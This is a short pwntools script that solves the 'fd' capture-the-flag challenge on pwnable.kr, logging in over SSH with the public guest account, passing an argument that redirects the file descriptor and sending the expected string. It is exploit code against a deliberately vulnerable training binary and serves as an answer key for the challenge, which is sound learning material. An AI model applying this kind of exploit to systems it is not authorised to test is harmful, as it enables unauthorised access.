

from pwn import *

s = ssh(host='pwnable.kr',user = 'fd', password='guest', port = 2222)
p = s.process(argv=['./fd','4660'],executable='./fd')
p.sendline("LETMEWIN")
p.interactive()
